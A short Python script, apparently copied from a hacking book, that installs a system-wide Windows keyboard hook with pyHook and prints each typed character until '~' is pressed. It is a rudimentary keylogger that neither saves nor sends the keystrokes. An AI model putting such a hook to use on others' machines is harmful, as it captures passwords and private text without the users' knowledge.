#lifted from hacking with python , alphy books
#requires : https://sourceforge.net/projects/pyhook/files/latest/download?source=files
import pyHook
import pythoncom

def keypress(event):
    if event.Ascii:
        char=chr(event.Ascii)
        print char

        if char=="~":
           exit();

hm=pyHook.HookManager()
hm.KeyDown=keypress
hm.HookKeyboard()
pythoncom.PumpMessages()
exit()
